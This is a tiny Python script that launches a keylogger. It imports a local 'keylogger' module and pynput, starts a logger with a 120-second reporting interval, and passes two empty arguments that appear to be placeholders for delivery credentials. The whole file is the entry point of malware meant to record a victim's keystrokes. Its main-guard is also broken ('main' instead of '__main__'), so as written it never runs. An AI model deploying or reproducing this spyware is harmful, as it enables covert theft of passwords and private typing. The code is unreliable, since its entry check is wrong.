#!/usr/bin/env python3

import keylogger
import pynput.keyboard
def main():
    my_keylogger=keylogger.Keylogger(120,"","")
    my_keylogger.start()

if __name__=="main":
    main()